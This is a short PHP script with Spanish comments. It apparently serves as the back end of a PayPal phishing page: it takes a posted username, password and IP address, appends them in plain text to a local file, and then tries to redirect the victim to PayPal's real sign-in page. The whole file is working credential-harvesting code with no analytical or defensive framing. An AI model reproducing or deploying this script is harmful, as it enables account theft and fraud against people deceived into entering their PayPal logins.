<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $ip = $_POST["ip"];

    // Guardar los datos en un archivo de texto
    $datos = "IP del usuario: $ip\r\nNombre de usuario: $username\r\nContraseña: $password\r\n";
    file_put_contents("datos_formulario.txt", $datos, FILE_APPEND);

    // Redirigir al usuario a una página específica
    header("https://www.paypal.com/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount%2Fsummary&state=");
    exit;
}
?>
